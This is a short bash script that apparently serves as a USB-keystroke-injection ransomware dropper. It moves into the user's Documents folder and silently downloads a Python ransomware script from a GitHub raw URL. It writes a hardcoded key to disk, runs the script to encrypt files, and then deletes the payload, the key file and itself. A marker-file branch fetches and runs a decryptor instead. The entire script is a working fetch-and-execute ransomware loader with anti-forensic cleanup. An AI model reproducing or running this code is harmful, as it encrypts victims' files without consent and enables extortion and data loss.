#!/bin/bash
curloc=`pwd`
targetPath=~/Documents/
key=uV2N981xqbXCHC8Z44qIJAgIwDQY9GLpNLF15BuHHhs=
source="https://raw.githubusercontent.com/MistyRavager/RubberDucky/main/ransomeware.py"
source2="https://raw.githubusercontent.com/MistyRavager/RubberDucky/main/decrypt.py"


cd $targetPath

if [[ ! -f ${targetPath}kludgefix ]]
then
    wget $source  >/dev/null 2>&1 
    if [ $? == 0 ]; then
        echo "${key}" | cat > key.key
        python3 ransomeware.py
        rm ./ransomeware.py
    fi
else  
    wget $source2  >/dev/null 2>&1 
    if [ $? == 0 ]; then
        echo "${key}" | cat > key.key
        python3 decrypt.py
        rm ./decrypt.py
    fi   
fi

rm key.key 
cd $curloc
rm ./init_script.sh